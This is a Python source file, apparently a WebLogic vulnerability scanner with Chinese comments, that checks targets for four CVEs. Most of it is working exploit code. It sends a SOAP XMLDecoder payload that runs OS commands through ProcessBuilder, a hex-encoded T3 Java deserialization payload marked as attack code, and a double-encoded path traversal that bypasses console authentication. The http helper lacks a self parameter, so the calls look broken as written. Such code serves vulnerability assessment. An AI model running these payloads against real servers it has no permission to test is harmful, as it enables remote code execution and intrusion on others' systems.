#!/usr/bin/env python
# -*- coding: utf-8 -*-

import re
import socket
import time
from typing import Dict, Tuple
from urllib.parse import urlparse

import requests
from urllib3.util import Url


class weblogic:

    def __init__(self):
        pass

    def ALL(self,args):
        self.url=args
        self.results=[]
        self.results.append(self.url)
        self.light_up1() #CVE-2017-10271
        self.light_up2() #CVE-2018-2628
        self.light_up3() #CVE-2018-2894
        self.light_up4() #CVE-2020-14882


        return self.results

    def http(url, method='GET', headers=None, params=None, data=None, verify=False, timeout=10, ssl=None,
             session=None) -> (
            Tuple[requests.Response, None], Dict):
        if not headers:
            headers = {}
        headers.update({'User-Agent': 'TestUA/1.0'})
        nurl = Url(url)
        if session == False:
            session = requests
        if not session:
            session = requests.session()
        try:
            if ssl:
                raise requests.exceptions.SSLError('force ssl')
            nurl.scheme = 'http'
            return session.request(method, nurl.url_full(), headers=headers, params=params, data=data, timeout=timeout,
                                   verify=verify), {'code': 0, 'message': 'request success'}
        except requests.exceptions.RequestException as e:
            if ssl == False:
                return None, {'code': -10, 'message': e.__str__()}
            try:
                nurl.scheme = 'https'
                return session.request(method, nurl.url_full(), headers=headers, params=params, data=data,
                                       timeout=timeout,
                                       verify=verify), {'code': 0, 'message': 'request success'}
            except requests.exceptions.RequestException as e:
                return None, {'code': -10, 'message': e.__str__()}
    def light_up1(self, cmd='whoami',force_ssl=None):
        headers = {
            'Content-Type': 'text/xml;charset=UTF-8',
            'User-Agent': 'TestUA/1.0'
        }

        url = self.url
        t_data = ''
        for i, c in enumerate(cmd.split()):
            t_data += '<void index="{}"><string>{}</string></void>'.format(
                i, c)
        data = '''
       <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
         <soapenv:Header>
           <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
             <java>
               <void class="java.lang.ProcessBuilder">
                 <array class="java.lang.String" length="2">
                   {}
                 </array>
                 <void method="start"/>
               </void>
             </java>
           </work:WorkContext>
         </soapenv:Header>
         <soapenv:Body/>
       </soapenv:Envelope>
       '''.format(t_data)
        try:
            res, data = self.http(url, 'POST', data=data, timeout=3,
                                  headers=headers, ssl=force_ssl)
            if res != None and ('<faultstring>java.lang.ProcessBuilder' in res.text or "<faultstring>0" in res.text):
                self.results.append('存在 CVE-2017-10271')
        except:
            pass

    def light_up2(self, delay=2, timeout=5):
        # 对端响应数据需要一段时间，使用 delay 来控制，如果不成功，可以加到 3s 左右，超过这个基本都是打了补丁的
        # t3 handshake
        parsed_url = urlparse(self.url)

        # 获取域名/IP地址和端口号
        dip = parsed_url.hostname
        port = parsed_url.port

        dport = int(port)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        try:
            sock.connect((dip, dport))
        except socket.timeout:
           pass
        except ConnectionRefusedError:
            pass
        sock.send(bytes.fromhex(
            '74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'))
        time.sleep(delay)
        sock.recv(1024)

        # build t3 request object
        data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'
        data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format(
            '{:04x}'.format(dport))
        data3 = '1a7727000d3234322e323134'
        data4 = '2e312e32353461863d1d0000000078'
        for d in [data1, data2, data3, data4]:
            sock.send(bytes.fromhex(d))

        # send evil object data
        payload = '056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'
        # -------- attack code start --------
        payload += 'aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707729000a556e69636173745265660000000005a2000000005649e3fd00000000000000000000000000000078'
        # --------- attack code end ---------
        payload += 'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'
        payload = '%s%s' % ('{:08x}'.format(len(payload) // 2 + 4), payload)
        sock.send(bytes.fromhex(payload))
        time.sleep(delay)
        try:
            res = sock.recv(4096)
            r = re.search(b'\\$Proxy[0-9]+', res)
            if r is not None:
                self.results.append('存在CVE-2018-2628')
            #return not r is None, {'msg': 'finish.'}
        except socket.timeout:
            pass

    def light_up3(self, force_ssl=None, *args, **kwargs) :
        headers={'User-Agent': 'TestUA/1.0'}
        parsed_url = urlparse(self.url)

        # 获取域名/IP地址和端口号
        dip = parsed_url.hostname
        dport = parsed_url.port


        try:
            url = 'http://{}:{}/wsutc/begin.do'.format(dip, dport)
            b_res, data = self.http(url, ssl=force_ssl)
            url = 'http://{}:{}/ws_utc/config.do'.format(dip, dport)
            c_res, data = self.http(url, ssl=force_ssl)
            if (b_res and b_res.status_code == 200) or (c_res and c_res.status_code == 200):
                self.results.append('存在CVE-2018-2894')


        except:
            pass

    def light_up4(self, force_ssl=None):
        session = requests.session()
        headers = {'User-Agent': 'TestUA/1.0'}
        parsed_url = urlparse(self.url)

        # 获取域名/IP地址和端口号
        dip = parsed_url.hostname
        dport = parsed_url.port
        try:
            self.http('http://{}:{}/console/css/%252e%252e%252fconsole.portal'.format(dip,
                                                                                      dport), ssl=force_ssl, session=session)
            r, data = self.http('http://{}:{}/console/css/%252e%252e%252fconsole.portal'.format(
                dip, dport), ssl=force_ssl, session=session)

            if r and r.status_code == 200:
                self.results.append('存在CVE-2020-14882')


        except:
            pass




